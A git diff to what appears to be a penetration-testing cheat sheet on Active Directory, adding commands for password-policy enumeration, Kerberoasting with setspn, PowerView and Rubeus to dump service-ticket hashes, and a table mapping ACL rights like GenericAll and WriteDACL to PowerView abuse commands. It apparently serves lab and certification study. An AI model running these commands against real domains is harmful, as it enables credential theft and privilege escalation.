@@ -1,6 +1,6 @@
 ---
 layout: app
-title: "Active Directory"
+title: "Active Directory Enumeration"
 tags: ["PASSWD_NOTREQD","enumeration","unconstrain delegation","kerberos","Double-hop", "GPO","OU", "finduserdomain","asreproasting"]
 section: "Active Directory"
 ---
@@ -36,11 +36,64 @@ Enter-PSSession <Session Id>
 $dc = New-PSSession -ComputerName <IP Address>  -Credential (Get-Credential)
 Enter-PSSession $dc
 ```
+# Enumeration
 
-# Passwords in Description Field 
+[PowerView Wiki](https://powersploit.readthedocs.io/en/latest/Recon/Get-Domain/)
+
+## Password Policy
+
+```bash
+nxc smb [IP] -u [username] -p [password] --pass-pol
+```
+
+### Password Policy - from Linux - LDAP Anonymous Bind
+
+```bash
+ldapsearch -h 172.16.5.5 -x -b "DC=domain,DC=domain" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
+```
+
+```bash
+net accounts
+```
+
+
+### Error: Account is Disabled
+
+```powershell
+net use \\DC01\ipc$ "" /u:guest
+System error 1331 has occurred.
+
+This user can't sign in because this account is currently disabled.
+```
+
+### Error: Password is Incorrect
+
+```powershell
+net use \\DC01\ipc$ "password" /u:guest
+System error 1326 has occurred.
+
+The user name or password is incorrect.
+```
+
+### Error: Account is locked out (Password Policy)
+
+```powershell
+net use \\DC01\ipc$ "password" /u:guest
+System error 1909 has occurred.
+
+The referenced account is currently locked out and may not be logged on to.
+```
+
+
+## Passwords in Description Field 
 
 ```
 (PowerView)> Get-DomainUser * | Select-Object samaccountname,description | Where-Object {$_.Description -ne $null}
+```
+
+```
+(PowerView)> Get-Domain
+(PowerView)> Get-Domain [[-Domain] <String>] [-Credential <PSCredential>]
 ```
 
 # ASREPRoasting
@@ -62,13 +115,36 @@ kerbrute userenum -d <domain> --dc <Domain IP address> <wordlists>
 Get-NPUsers.py <DOMAIN/> -dc-ip <Domain IP> -no-pass -usersfile <wordlists>
 ```
 
+# Kerberoasting
+
+## Get Kerberoastable users
+
+```powershell
+setspn.exe -Q */*
+(PowerView)> Get-NetUser -SPN | select samaccountname, serviceprincipalname
+.\Rubeus.exe kerberoast /stats
+```
+## Get TGSs for ALL kerberoastable accounts
+
+```powershell
+setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
+
+(powerview)> Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat
+```
+
+## Get hashes for all accounts
+```powershell
+.\Rubeus.exe kerberoast /simple /outfile:hashes.txt
+```
+
+
+
 # PASSWD_NOTREQD
 [https://blog.icewolf.ch/archive/2011/06/08/how-to-read-the-value-of-ad-attribute-useraccountcontrol/](https://blog.icewolf.ch/archive/2011/06/08/how-to-read-the-value-of-ad-attribute-useraccountcontrol/)
 
 ```
 (PowerView)> Get-DomainUser -UACFilter PASSWD_NOTREQD | select samaccountname,useraccountcontrol
 ```
-
 
 # Double-Hob
 
@@ -162,6 +238,8 @@ Get-NetGroupMember Group | Select MemberName
 
 # Find Information
 
+> Check attacks type using BloodHound
+
 ## Find domain Admin
 
 Finds domain machines where specific users are logged into.
@@ -219,12 +297,35 @@ Get-DomainGPOUserLocalGroupMapping -Identity student1 -Verbose
 (Get-DomainOU -Identity MachineOU).distinguishedname | %{Get-DomainComputer -SearchBase $_} | select Name
 ```
 
-### ACL
+## Access Control Entries (ACEs)
+
+
+* **ForceChangePassword** abused with **Set-DomainUserPassword**
+* **Add Members** abused with **Add-DomainGroupMember**
+* **GenericAll** abused with **Set-DomainUserPassword** or **Add-DomainGroupMember**
+* **GenericWrite** abused with **Set-DomainObject**
+* **WriteOwner** abused with **Set-DomainObjectOwner**
+* **WriteDACL** abused with **Add-DomainObjectACL**
+* **AllExtendedRights** abused with **Set-DomainUserPassword** or **Add-DomainGroupMember**
+* **Addself** abused with **Add-DomainGroupMember**
+
+
+
+## ACL
+
+### Get ACLs of an object (permissions of other objects over the indicated one)
+
+```powershell
+Get-ObjectAcl -SamAccountName <username> -ResolveGUIDs
+```
+
 
 ```powershell
 Get-DomainObjectAcl -SamAccountName "username" -ResolveGUIDS
 Get-DomainObjectAcl -SearchBase "LDAP://CN=Domain Admins, CN=Users,DC=crtp,DC=lab" -ResolveGUIDS
 ```
+
+# Find intresting ACEs (Interesting permisions of "unexpected objects" (RID>1000 and modify permissions) over other objects
 ```powershell
  Find-InterestingDomainAcl -ResolveGUIDs
  Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "username"}
